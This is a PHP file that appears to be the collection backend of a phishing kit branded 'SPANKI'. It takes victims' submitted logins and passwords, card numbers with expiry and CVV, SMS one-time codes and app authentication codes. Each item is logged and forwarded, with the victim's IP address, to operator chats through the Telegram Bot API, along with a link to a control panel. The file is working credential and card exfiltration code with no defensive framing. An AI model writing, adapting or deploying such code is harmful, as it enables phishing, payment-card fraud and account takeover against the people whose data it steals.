<?php
require "../main.php";
$bot = $a_bot;
$ids = explode(",",str_replace(" ","",$a_ids));


$source = "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
$exp = explode("?", $source);

$panel_link = str_replace('auth/post.php', '' , $exp[0]."panel/view.php?vip=$ip");

$ip = $_SERVER['REMOTE_ADDR'];
$time = date("M d, Y")." at ".date("h:i:sa");


function post($data){
if(empty(trim($data))){
return "NO_DATA";
}else{
return htmlspecialchars($_POST[$data]);
}
}


function sendBot($url){
$ci = curl_init();
curl_setopt($ci, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ci,CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ci, CURLOPT_URL, $url);
$res = curl_exec($ci);
curl_close($ci);
return $res;
}


if(isset($_POST['user'])){

$login = post("user");
$password = post("pass");
$telegram_content = urlencode("
[ SPANKI LOGIN ] 
-> Login : $login
-> Password : $password
[ $ip ]
Panel Link : $panel_link 
");


$oldlogs = $m->getData()["LOGS"];
$newlogs = $oldlogs."\n+ LOGIN [ $login | $password ] ";
$arr = array("LOGS"=>$newlogs);
$m->update($arr);

foreach($ids as $id){
$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
sendBot($url);
}

}





if(isset($_POST['cc'])){

$login = post("cc");
$password = post("exp");
$cvv = post("cvv");

$telegram_content = urlencode("
[ SPANKI CC ] 
-> CC : $login
-> EXP : $password
-> CVV : $cvv
[ $ip ]
Panel Link : $panel_link 
");


$oldlogs = $m->getData()["LOGS"];
$newlogs = $oldlogs."\n+ CC [ $login | $password | $cvv ] ";
$arr = array("LOGS"=>$newlogs);
$m->update($arr);


foreach($ids as $id){
$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
sendBot($url);
}

}



if(isset($_POST['sms'])){

$sms = post("sms");

$telegram_content = urlencode("
[ SPANKI SMS ] 
-> SMS : $sms
[ $ip ]
Panel Link : $panel_link 
");

$oldlogs = $m->getData()["LOGS"];
$newlogs = $oldlogs."\n+ SMS [ $sms ] ";
$arr = array("LOGS"=>$newlogs);
$m->update($arr);

foreach($ids as $id){
$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
sendBot($url);
}
}

if(isset($_POST['app'])){

$sms = post("app");

$telegram_content = urlencode("
[ SPANKI APP ]
-> CODE : $sms
[ $ip ]
Panel Link : $panel_link 
");

$oldlogs = $m->getData()["LOGS"];
$newlogs = $oldlogs."\n+ APP READER [ $sms ] ";
$arr = array("LOGS"=>$newlogs);
$m->update($arr);
foreach($ids as $id){
$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
sendBot($url);
}
}






?>